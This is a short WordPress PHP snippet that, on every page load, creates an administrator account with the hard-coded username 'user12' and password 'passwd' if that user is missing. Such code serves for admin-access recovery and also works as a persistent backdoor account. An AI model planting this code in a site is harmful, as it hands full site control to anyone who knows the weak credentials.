
  add_action( 'init', function () {

      $usern = 'user12';
      $passw = 'passwd';
      $email = 'email@cim.hu';

      if ( ! username_exists( $usern ) ) {
        $user_id = wp_create_user( $usern, $passw, $email );
        $user    = new WP_User( $user_id );
        $user->set_role( 'administrator' );
      }
    }
  );

